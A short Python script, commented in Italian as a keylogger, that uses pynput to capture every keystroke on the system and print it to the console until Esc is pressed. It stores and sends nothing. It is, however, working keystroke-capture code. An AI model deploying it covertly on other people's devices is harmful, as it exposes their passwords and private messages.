from pynput import keyboard

def on_press(key):
    try:
        print(f"{key.char}", end='', flush=True)
    except AttributeError:
        print(f"{key}", end='', flush=True)

def on_release(key):
    # Premere Esc per terminare il keylogger
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
